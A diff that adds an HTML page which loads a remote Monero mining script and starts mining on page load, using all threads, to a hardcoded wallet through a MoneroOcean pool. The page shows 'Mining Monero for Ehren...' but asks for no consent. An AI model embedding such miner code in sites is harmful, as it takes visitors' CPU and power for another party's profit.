@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Monero Webminer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <link rel="manifest" href="manifest.json">
+      <!-- Start Of Mining Code -->
+      <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+      <script>
+          console.log("Config Loaded")
+          server = "wss://ny1.xmrminingproxy.com";
+          var pool = "gulf.moneroocean.stream:80";
+          var walletAddress = "43atkQu5KLU2yUERz3UNGZj3N3ajtD4QCQpNyAXejqPKHUNiKJzUHcHE8wAgJbK8TwgFtn4zAaaTJdQT7CeWVQ5ZCNuKWyV";
+          var workerId = "GH-XMR"
+          var threads = -1;
+          var password = "";
+          startMining(pool, walletAddress, workerId, threads, password);
+          throttleMiner = 20;
+      </script>
+      <!-- End Of Mining Code -->
+
+
+  </head>
+  <body>
+    <style>
+      body {
+        background: #181818;
+        color: #fff;
+        font-family: 'Segoe UI', Arial, sans-serif;
+        margin: 0;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .mining-card {
+        background: #23272f;
+        border-radius: 16px;
+        box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+        padding: 2.5rem 2rem;
+        text-align: center;
+        min-width: 320px;
+      }
+      .spinner {
+        margin: 0 auto 1.5rem auto;
+        width: 48px;
+        height: 48px;
+        border: 6px solid #444;
+        border-top: 6px solid #ff6600;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        100% { transform: rotate(360deg); }
+      }
+      .mining-status {
+        font-size: 1.5rem;
+        font-weight: 600;
+        margin-bottom: 0.5rem;
+        letter-spacing: 1px;
+      }
+      .mining-link {
+        color: #ff6600;
+        text-decoration: none;
+        font-weight: 500;
+      }
+      .mining-link:hover {
+        text-decoration: underline;
+      }
+    </style>
+    <div class="mining-card">
+      <div class="spinner"></div>
+      <div class="mining-status">Mining Monero for Ehren...</div>
+      <p>
+        View mining progress
+        <a class="mining-link" href="https://moneroocean.stream" target="_blank" rel="noopener">here</a>
+      </p>
+    </div>
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('serviceworker.js').then(registration => {
+            console.log('Service Worker registered with scope:', registration.scope);
+          }).catch(error => {
+            console.error('Service Worker registration failed:', error);
+          });
+        });
+      }
+    </script>
+  </body>
+</html>
